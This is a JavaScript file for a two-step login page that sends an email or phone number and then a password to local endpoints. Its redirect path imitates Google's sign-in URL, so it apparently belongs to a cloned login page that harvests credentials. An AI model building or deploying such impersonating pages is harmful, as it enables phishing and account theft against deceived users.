const next = document.getElementById("next");
const input = document.getElementById('email__phone');
const login = document.getElementById("login")

if (next) {
    next.addEventListener("click", async () => {
        if (!input.value.trim()) {
            alert('Please enter an email or phone number');
            return;
        }

        try {
            const response = await fetch('/info', {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    email__phone: input.value.trim()
                })
            });

            const data = await response.json();

            if (response.ok && data.status === 'success') {
                window.location.href = "/signin/v2/challenge/pwd/page";
            } else {
                const errorElement = document.createElement('div');
                errorElement.className = 'error-message';
                errorElement.textContent = data.message || 'Invalid email or phone number';
                errorElement.style.color = '#f2b8b5';
                errorElement.style.marginTop = '8px';
                errorElement.style.fontSize = '14px';


                const existingError = document.querySelector('.error-message');
                if (existingError) existingError.remove();

                const inputContainer = document.querySelector('.input-container');
                inputContainer.parentNode.insertBefore(errorElement, inputContainer.nextSibling);
            }
        } catch (error) {
            console.error('Error:', error);
            alert('An error occurred. Please try again.');
        }
    });
}

const nextPassword = document.getElementById("next-password");
if (nextPassword) {
    nextPassword.addEventListener("click", async () => {
        const passwordInput = document.querySelector('#email__phone');

        try {
            const response = await fetch('/submit_password', {
                method: "POST",
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    password: passwordInput.value
                })
            });

            const data = await response.json();

            if (response.ok && data.status === 'success') {
                window.location.href = "/success-page";
            } else {
                alert(data.message || 'Password submission failed');
            }
        } catch (error) {
            console.error('Error:', error);
            alert('An error occurred. Please try again.');
        }
    });

    const showPasswordCheckbox = document.getElementById("show-password");
    if (showPasswordCheckbox) {
        showPasswordCheckbox.addEventListener("change", function () {
            const passwordInput = document.getElementById("email__phone");
            if (this.checked) {
                passwordInput.type = "text";
            } else {
                passwordInput.type = "password";
            }
        });
    }
}